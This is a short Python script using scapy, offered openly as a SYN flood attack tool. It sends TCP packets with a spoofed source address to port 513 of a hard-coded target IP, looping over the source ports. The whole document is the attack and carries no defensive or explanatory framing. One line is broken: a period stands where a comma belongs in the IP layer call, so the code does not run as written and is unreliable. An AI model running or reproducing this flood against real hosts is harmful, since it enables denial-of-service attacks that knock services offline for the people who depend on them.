"""
Description: Uses python to create a SYN flood attack.
Author: Aleksa Zatezalo
Date: June 23, 2023
"""

from scapy.all import *

def synFlood(src, tgt):
    for sport in range(1024, 65535):
        IPlayer = IP(src=src. dst=tgt)
        TCPlayer = TCP(sport=sport, dport=513)
        pkt = IPlayer / TCPlayer
        send(pkt)
src = "10.1.1.2"
tgt = "192.168.1.3"

synFlood(src, tgt)